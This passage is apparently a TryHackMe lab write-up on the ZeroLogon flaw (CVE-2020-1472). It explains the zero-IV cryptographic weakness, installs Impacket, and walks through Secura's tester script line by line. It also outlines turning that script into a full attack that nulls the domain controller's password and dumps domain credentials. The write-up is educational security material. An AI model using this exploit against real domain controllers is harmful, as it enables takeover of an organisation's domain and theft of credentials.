---
Learn about and exploit the ZeroLogon vulnerability that allows an attacker to go from Zero to Domain Admin without any valid credentials.
---

# ZeroLogon — Writeup

## Overview
### ZeroLogon — Writeup
### ZeroLogon — Writeup
### The Zero Day Angle
The purpose of this room is to shed light on the ZeroLogon vulnerability within an educational focus. This is done such that defenders can better understand the threat faced herein. The ZeroLogon vulnerability is approached from a "Proof of Concept" emphasis, providing a breakdown of the vulnerable method within this issue. TryHackMe does not condone illegal actions taken on the part of the individual.
Zero Logon - The Zero Day Angle
About The vulnerability -
On September 14, Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon.
Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts. In short -- the attack mainly focuses on a poor implementation of Cryptography. To be more specific, Microsoft chose to use AES-CFB8 for a function called ComputeNetlogonCredential, which is normally fine, except they had hard coded the Initialization Vector to use all zeros instead of a random string. When an attacker sends a message only containing zeros with the IV of zero, there is a 1-in-256 chance that the Ciphertext will be Zero.
But how is that useful to us? We'll touch on that note in the following sections.
About Machine Accounts -
Normally, if we tried a statistics based attack on any user account, we would get locked out. This is not the case if we apply this principal to machine accounts. Machines accounts behave in a much different way than standard user accounts. They have no predefined account lockout attempts because a 64+ character alpha numeric password is normally used to secure them, making them very difficult to break into. They're not meant to be accessed by an end user by any means. In certain circumstances, we can dump the machine account password using a tool like Mimikatz, but if we're at that point, we've already compromised the machine -- and we're looking for persistence within the domain, not lateral movement.
Abusing the Vulnerability -
Machine accounts often hold system level privileges which we can use for a variety of things. If you're not familiar with Active Directory, we can take the Domain Controller's Machine Account and attempt to use the granted authentication in conjunction with Secretsdump.py (SecretsDump is a password dumping utility like Mimikatz, except it lives on the Network instead of the host) to dump all of the passwords within the domain. At this point we have a rough kill chain starting to form:
Use Zero Logon to bypass authentication on the Domain Controller's Machine Account -> Run Secretsdump.py to dump credentials -> Crack/Pass Domain Admin Hashes -> ??? -> Profit
Analyzing the MS-NRPC Logon Process -
At this point, we know a vulnerability exists, but we're not quite sure how to exploit it yet. We'll be covering that soon, but what we do know there's a vulnerability within the way Microsoft handles Authentication within ComputeNetLogonCredetial function of MS-NRPC. To better understand the vulnerability, we need to do a bit of a deeper dive on how Microsoft handles authentication to NRPC.
To analyze where the vulnerability occurs, we'll be using the Diagram provided by Secura as well as Microsoft Documentation to decipher the magic behind Zero Logon. The sources can be found at the bottom of this task.
![](https://www.zdnet.com/a/hub/i/2020/09/11/91ce3485-5a9b-4fd7-9bdb-908084954c58/zerologon-attack.png)
Source: Secura
Step 1. The client creates a NetrServerReqChallenge and sends it off [Figure 1. Step 1]. This contains the following values:
1. The DC
2. The Target Device (Also the DC, in our case)
3. A Nonce (In our case is 16 Bytes of Zero).
Step 2. The server receives the NetrServerReqChallenge, the server will then generate it's own Nonce (This is called the Server Challenge), the server will send the Server Challenge back. [Figure 1. Step 2]
Step 3. The client (us) will compute it's NetLogon Credentials with the Server Challenge provided [Figure 1. Step 3]. It uses the NetrServerAuthenticate3 method which requires the following parameters:
1. A Custom Binding Handle (Impacket handles this for us, it's negotiated prior)
2. An Account Name (The Domain Controller's machine account name. ex: DC01$)
3. A Secure Channel Type (Impacket sort of handles this for us, but we still need to specify it: [nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel])
4. The Computer Name (The Domain Controller ex: DC01)
5. The Client Credential String (this will be 8 hextets of \x00 [16 Bytes of Zero])
6. Negotiation Flags (The following value observed from a Win10 client with Sign/Seal flags disabled: 0x212fffff Provided by Secura)
Step 4. The server will receive the NetrServerAuthenticate request and will compute the same request itself using it's known, good values. If the results are good, the server will send the required info back to the client. [Figure 1. Step 4.]
At this point the attempt to exploit the Zero Logon vulnerability is under way. The above steps above will be looped through a certain number of times to attempt to exploit the Zero Logon vulnerability. The actual exploit occurs at Step 3 and 4, this where we're hoping for the Server to a have the same computations as the client. This is where are 1-in-256 chance comes in.
Step 5. If the server calculates the same value, the client will re-verify and once mutual agreement is confirmed, they will agree on a session key. The session key will be used to encrypt communications between the client and the server, which means authentication is successful. [Figure 1. Step 5]
From there, normal RPC communications can occur.
Sources -
1. Tom Tervoort of Secura - https://www.secura.com/pathtoimg.php?id=2055
1. Microsoft - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9
2. Microsoft - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9
Read about Zero Logon *No answer needed*
### Impacket Installation
Impacket Installation
Git Clone Impacket -
As a prior warning, Impacket can be quite fussy when it comes to some modules within nrpc.py, because of this, we recommend using the TryHackMe Attack Box. This will make the exploit run faster, additionally, we can attempt to provide better support via the Attack Box. Additionally, we are going to be using a Virtual Environment to Install Impacket. The instructions to install Impacket are as follows:
python3 -m pip install virtualenv
python3 -m virtualenv impacketEnv
source impacketEnv/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
After executing these commands, you should be placed within a Python3 Virtual Environment that will be compatible to modify the PoC to exploit Zero Logon.
Credit to Onurshin in the TryHackMe Discord for suggesting Python Virtual Environments.
Install Impacket in a Virtual Environment  *No answer needed*
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ mkdir zerologon_learning
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ cd zerologon_learning
```
```text
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ ls
```
```text
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ python3 -m pip install virtualenv
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: virtualenv in /usr/lib/python3/dist-packages (20.14.0+ds)
Requirement already satisfied: platformdirs<3,>=2 in /usr/lib/python3/dist-packages (from virtualenv) (2.5.1)
Requirement already satisfied: filelock<4,>=3.2 in /usr/lib/python3/dist-packages (from virtualenv) (3.6.0)
Requirement already satisfied: six<2,>=1.9.0 in /usr/lib/python3/dist-packages (from virtualenv) (1.16.0)
Requirement already satisfied: distlib<1,>=0.3.1 in /usr/lib/python3/dist-packages (from virtualenv) (0.3.4)
```
```text
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ python3 -m virtualenv impacketEnv
created virtual environment CPython3.10.5.final.0-64 in 951ms
  creator CPython3Posix(dest=/home/kali/Downloads/zerologon_learning/impacketEnv, clear=False, no_vcs_ignore=False, global=False)
  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv)
    added seed packages: pip==22.0.2, setuptools==59.6.0, wheel==0.37.1
  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator
```
```text
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ ls
impacketEnv
```
```text
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ cd impacketEnv
```
```text
┌──(kali㉿kali)-[~/Downloads/zerologon_learning/impacketEnv]
└─$ ls
bin  lib  pyvenv.cfg
```
```text
┌──(kali㉿kali)-[~/Downloads/zerologon_learning/impacketEnv]
└─$ cd bin
```
```text
┌──(kali㉿kali)-[~/Downloads/zerologon_learning/impacketEnv/bin]
└─$ ls
activate       activate.ps1      pip3      python3     wheel-3.10
activate.csh   activate_this.py  pip-3.10  python3.10  wheel3.10
activate.fish  deactivate.nu     pip3.10   wheel
activate.nu    pip               python    wheel3
```
```text
┌──(kali㉿kali)-[~/Downloads/zerologon_learning/impacketEnv/bin]
└─$ cd ..
```
```text
┌──(kali㉿kali)-[~/Downloads/zerologon_learning/impacketEnv]
└─$ cd ..
```
```text
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ ls
impacketEnv
```
```text
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ source impacketEnv/bin/activate
                                                                          
┌──(impacketEnv)─(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ pip install git+https://github.com/SecureAuthCorp/impacket
Collecting git+https://github.com/SecureAuthCorp/impacket
  Cloning https://github.com/SecureAuthCorp/impacket to /tmp/pip-req-build-rki56vmp
  Running command git clone --filter=blob:none --quiet https://github.com/SecureAuthCorp/impacket /tmp/pip-req-build-rki56vmp
  Resolved https://github.com/SecureAuthCorp/impacket to commit 3c6713e309cae871d685fa443d3e21b7026a2155
  Preparing metadata (setup.py) ... done
Collecting charset_normalizer
  Downloading charset_normalizer-2.1.1-py3-none-any.whl (39 kB)
Collecting dsinternals
  Downloading dsinternals-1.2.4.tar.gz (174 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 174.2/174.2 KB 6.2 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
Collecting flask>=1.0
  Downloading Flask-2.2.2-py3-none-any.whl (101 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 101.5/101.5 KB 17.2 MB/s eta 0:00:00
Collecting future
  Using cached future-0.18.2.tar.gz (829 kB)
  Preparing metadata (setup.py) ... done
Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5
  Downloading ldap3-2.9.1-py2.py3-none-any.whl (432 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 432.2/432.2 KB 19.1 MB/s eta 0:00:00
Collecting ldapdomaindump>=0.9.0
  Downloading ldapdomaindump-0.9.3-py3-none-any.whl (18 kB)
Collecting pyOpenSSL>=21.0.0
  Downloading pyOpenSSL-22.0.0-py2.py3-none-any.whl (55 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 55.8/55.8 KB 4.9 MB/s eta 0:00:00
Collecting pyasn1>=0.2.3
  Downloading pyasn1-0.4.8-py2.py3-none-any.whl (77 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 77.1/77.1 KB 10.4 MB/s eta 0:00:00
Collecting pycryptodomex
  Downloading pycryptodomex-3.15.0-cp35-abi3-manylinux2010_x86_64.whl (2.3 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 17.8 MB/s eta 0:00:00
Collecting six
  Downloading six-1.16.0-py2.py3-none-any.whl (11 kB)
Collecting Jinja2>=3.0
  Downloading Jinja2-3.1.2-py3-none-any.whl (133 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 133.1/133.1 KB 15.4 MB/s eta 0:00:00
Collecting Werkzeug>=2.2.2
  Downloading Werkzeug-2.2.2-py3-none-any.whl (232 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 232.7/232.7 KB 38.0 MB/s eta 0:00:00
Collecting itsdangerous>=2.0
  Downloading itsdangerous-2.1.2-py3-none-any.whl (15 kB)
Collecting click>=8.0
  Downloading click-8.1.3-py3-none-any.whl (96 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 96.6/96.6 KB 16.4 MB/s eta 0:00:00
Collecting dnspython
  Downloading dnspython-2.2.1-py3-none-any.whl (269 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 269.1/269.1 KB 16.2 MB/s eta 0:00:00
Collecting cryptography>=35.0
  Downloading cryptography-37.0.4-cp36-abi3-manylinux_2_24_x86_64.whl (4.1 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.1/4.1 MB 18.0 MB/s eta 0:00:00
Collecting cffi>=1.12
  Using cached cffi-1.15.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (441 kB)
Collecting MarkupSafe>=2.0
  Downloading MarkupSafe-2.1.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (25 kB)
Collecting pycparser
  Using cached pycparser-2.21-py2.py3-none-any.whl (118 kB)
Building wheels for collected packages: impacket, dsinternals, future
  Building wheel for impacket (setup.py) ... done
  Created wheel for impacket: filename=impacket-0.10.1.dev1+20220720.103933.3c6713e-py3-none-any.whl size=1487871 sha256=3f742b8ef787b7499e9ea24c814b81073eb2aad96dfbb7f2978b2dc8b3e87b7e
  Stored in directory: /tmp/pip-ephem-wheel-cache-xajhvzar/wheels/ba/74/12/0c6d9090c411dd62bb15ad6ef9bd5aa7ae8978239af79d0172
  Building wheel for dsinternals (setup.py) ... done
  Created wheel for dsinternals: filename=dsinternals-1.2.4-py3-none-any.whl size=208334 sha256=cc15969abe99c0e8c1b43f57d1a4a96f93154ac100befc22a4938efb9b9bf3ed
  Stored in directory: /home/kali/.cache/pip/wheels/dd/dc/71/93fb7be53723b600c4363af8f0bc1b88aee50a988d26266598
  Building wheel for future (setup.py) ... done
  Created wheel for future: filename=future-0.18.2-py3-none-any.whl size=491070 sha256=b3648abb7e564aa438f606e55475eb2c44d22658e85fffbfc0070a2de2422902
  Stored in directory: /home/kali/.cache/pip/wheels/22/73/06/557dc4f4ef68179b9d763930d6eec26b88ed7c389b19588a1c
Successfully built impacket dsinternals future
Installing collected packages: pyasn1, six, pycryptodomex, pycparser, MarkupSafe, ldap3, itsdangerous, future, dsinternals, dnspython, click, charset_normalizer, Werkzeug, ldapdomaindump, Jinja2, cffi, flask, cryptography, pyOpenSSL, impacket
Successfully installed Jinja2-3.1.2 MarkupSafe-2.1.1 Werkzeug-2.2.2 cffi-1.15.1 charset_normalizer-2.1.1 click-8.1.3 cryptography-37.0.4 dnspython-2.2.1 dsinternals-1.2.4 flask-2.2.2 future-0.18.2 impacket-0.10.1.dev1+20220720.103933.3c6713e itsdangerous-2.1.2 ldap3-2.9.1 ldapdomaindump-0.9.3 pyOpenSSL-22.0.0 pyasn1-0.4.8 pycparser-2.21 pycryptodomex-3.15.0 six-1.16.0
```
### The Proof of Concept
Modifying and Weaponizing the PoC
PoC and You -
Proof of Concepts are incredibly important to every exploit, without them, the exploit's are almost entirely theoretical. Fortunately, Secura was able to provide a working [Proof of Concept for Zero Logon](https://github.com/SecuraBV/CVE-2020-1472) that was 90% of the way there. We simply need to make an additional call to change the password to a null value, recall Figure 3 from Task 1, Secura was even kind enough to give us the method that we need to call ([NetrServerPasswordSet2](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)). Looking up the method within the Microsoft Documentation, it's very similar to [hNetSeverAuthenticate3](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9), so we're going to re-use some of the same variables from that, as well as the structure.
Analyzing the PoC -
﻿﻿Modifying and Weaponizing the PoC
PoC and You -
Proof of Concepts are incredibly important to every exploit, without them, the exploit's are almost entirely theoretical. Fortunately, Secura was able to provide a working Proof of Concept for Zero Logon that was 90% of the way there. We simply need to make an additional call to change the password to a null value, recall Figure 3 from Task 1, Secura was even kind enough to give us the method that we need to call (NetrServerPasswordSet2). Looking up the method within the Microsoft Documentation, it's very similar to hNetSeverAuthenticate3, so we're going to re-use some of the same variables from that, as well as the structure.
Analyzing the PoC -
Before we continue any further, you should download the PoC from Secura, which can be found here:
https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py
The script may seem quite daunting at first, but it's quite simple, if you think back to Figure 1 from Task 1, you'll quickly see how it all starts to fit together. Let's start by breaking the PoC down. We're going to be this in order of execution/importance so it's easier to digest:
Lines 3 - 13
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto
import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call
MAX_ATTEMPTS = 2000
Lines 1-4 import the required modules from Impacket, specifically the NRPC, EPM, Crypto, and Transport libraries. Additionally, on lines 6-8 a handful of other misc libraries are also imported, however, the Impacket libraries are the star of the show here. Lastly, on line 9, we're defining a constant (similar to a variable, but never changes) that sets the maximum number of retries for Zero Logon to 2000.
Lines 76 - 86
if __name__ == '__main__':
if not (3 <= len(sys.argv) <= 4):
print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
sys.exit(1)
else:
[_, dc_name, dc_ip] = sys.argv
dc_name = dc_name.rstrip('$')
perform_attack('\\\\' + dc_name, dc_ip, dc_name)
Next we skipped down to the very bottom of the script so some other variables will make sense later, Line 1 is essentially declaring a main function within Python, Line 2 we are checking for the amount of parameters, and ensuring that it's exactly 3 (zerologon_tester.py DCNAME IP). Lines 3-5 are printing the help menu only if it's greater than 3 arguments, or less than 2 and exiting. If the required arguments are supplied, on line 8 the arguments are being passed into two variables: dc_name, and dc_ip. After the arguments are passed, dc_name is being stripped of the "$" character, as the dc_name variable shouldn't have it. The user account name should however. Afterwards, it's passing the variables two variables and an additional, modified variable into a module called "perform_attack".
Lines 57 - 73
def perform_attack(dc_handle, dc_ip, target_computer):
print('Performing authentication attempts...')
rpc_con = None
for attempt in range(0, MAX_ATTEMPTS):
rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
if rpc_con == None:
print('=', end='', flush=True)
else:
break
if rpc_con:
print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
else:
print('\nAttack failed. Target is probably patched.')
sys.exit(1)
Line 1 is defining where the variables are being passed into for the local function, \\DCNAME is being passed into the dc_handle variable, dc_ip is being passed into dc_ip variable, and dc_name is being passed into the target_computer variable. All of which will be used later, or passed into different modules.
Line 4 sets the variable rpc_con equal to none, this will be kept track of consistently to check and see if authentication is successful, if it's not, the script will continue until 2000 retries is hit. Line 5 is where the actual retries for Zero Logon occurs in the form of a for loop. Line 6 sets the rpc_con variable to the output of a different function called "try_zero_authenticate" with a couple of variables being passed to it, specifically dc_handle, dc_ip, and target_computer. All of which we addressed earlier. The next lines are simply checking if rpc_con is equal to a invalid login attempt, if it is, print =, if not, print success, if 2000 retries is hit: print attack failed.
Lines 20-25
def try_zero_authenticate(dc_handle, dc_ip, target_computer):
binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
rpc_con.connect()
rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
Line 1 is defining the try_zero_authenticate function and is taking the previously mentioned 3 variables as input, and is passing them into the function. Lines 3-6 are establishing a bind and a session with NRPC over TCP/IP so that we can communicate with the domain controller.
Lines 27-40
plaintext = b'\x00' * 8
ciphertext = b'\x00' * 8
flags = 0x212fffff
nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
try:
server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + '\x00', ciphertext, flags)
Line 1 and 2 are establishing two new variables, plaintext and ciphertext containing 16 Bytes of "\x00" which will be used to exploit the Zero Logon vulnerability. Line 4 contains a variable called Flags. These are the default flags observed from a Windows 10 Client (using AES-CFB8) with the Sign and Seal bit disabled (Source/Credit: Secura).
Line 6 is where the fun beings -- This is where Step 1 beings in Figure 1, the client creates a NetrServerReqChallenge containing the following information required by the Microsoft Documentation:
NTSTATUS NetrServerReqChallenge(
